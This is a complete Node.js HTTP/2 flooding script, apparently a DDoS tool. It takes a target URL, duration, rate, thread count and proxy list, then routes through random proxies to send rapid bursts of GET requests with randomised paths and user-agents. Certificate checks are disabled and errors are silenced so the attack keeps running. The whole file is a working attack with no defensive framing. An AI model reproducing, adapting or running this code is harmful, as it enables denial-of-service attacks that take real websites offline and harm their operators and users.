const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () {});

if (process.argv.length < 7) process.exit();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
}
const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "invalid proxy");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "timeout");
        });
        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error");
        });
    }
}
const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 5,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
            ecdhCurve: 'auto',
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            socket: connection
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 1000000,
                initialWindowSize: 6291456
            },
            createConnection: () => tlsConn,
        });
        client.on("connect", () => {
            const attack = setInterval(() => {
                const headers = {
                    ":method": "GET",
                    ":authority": parsedTarget.host,
                    ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
                    ":scheme": "https",
                    "user-agent": randstr(12),
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-US",
                    "x-requested-with": "XMLHttpRequest"
                };
                for (let i = 0; i < args.rate; i++) {
                    const req = client.request(headers);
                    req.on("error", () => req.close());
                    req.end();
                }
            }, 10);
            setTimeout(() => {
                clearInterval(attack);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            }, args.time * 1000);
        });
        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}
